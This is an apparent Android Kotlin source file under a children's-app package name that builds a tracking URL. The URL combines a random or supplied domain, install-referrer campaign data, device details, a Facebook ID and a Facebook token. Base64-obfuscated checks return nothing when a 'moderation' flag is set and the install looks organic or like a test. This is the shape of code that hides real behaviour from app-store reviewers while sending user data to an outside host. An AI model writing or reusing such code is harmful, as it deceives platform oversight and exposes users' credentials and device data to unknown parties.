package com.sinyee.babybus.simpleUrlBuilderNoAppsFinalModeration

import android.app.Activity
import com.sinyee.babybus.simpleUrlBuilderNoAppsFinalModeration.sdk.referrer.ReferrerNoAppsData
import com.sinyee.babybus.simpleUrlBuilderNoAppsFinalModeration.utils.DomenHolder
import com.sinyee.babybus.simpleUrlBuilderNoAppsFinalModeration.utils.FacebookConst
import com.sinyee.babybus.simpleUrlBuilderNoAppsFinalModeration.utils.decrypt

object SimpleUrlBuilderNoAppsFinalModeration {
    suspend fun build(
        domen: String? = null,
        fbKey: String,
        devKey: String,
        battery: String? = null,
        facebookId: String,
        facebookToken: String,
        isDevSettings: Boolean? = null,
        context: Activity,
        isStaticFacebook: Boolean,
        isModeration: Boolean
    ): GameInfoData? {
        val deviceData = DeviceDataBuilder(
            battery = battery.toString(),
            isDevSettings = isDevSettings,
            context = context,
            devKey = devKey,
            facebookId = facebookId,
            facebookToken = facebookToken,
        ).getDeviceInfoUseCase()

        FacebookConst.setFacebookConst(id = facebookId, token = facebookToken, isStaticFacebook)

        val tracker: String = domen ?: DomenHolder.getRandomDome()
        val referrerData = ReferrerNoAppsData(context).getReferrerData(fbKey)
        val campaign = referrerData.campaign
        val appsFlyerStr = referrerData.info
        val deviceDataStr = deviceData.info
        val afUserId = deviceData.userId
        val referrerAccountId = referrerData.accountId

        if (isModeration) {
            if (campaign == "bnVsbA==".decrypt() && referrerAccountId == "JmFjY291bnRfaWQ9bnVsbA==".decrypt()) return null
            if (campaign == "dGVzdA==".decrypt()) return null
        }

        val subsData = SubBuilder.getSubData(campaign)
        val push = subsData.gameItem
        val subsStr = subsData.gameItems
        val pushStr = "${"JnB1c2g9".decrypt()}$push"
        val url = "$tracker$referrerAccountId$appsFlyerStr$deviceDataStr$subsStr$pushStr"
        return GameInfoData(info = url, userIdInfo = afUserId, push = push)
    }
}

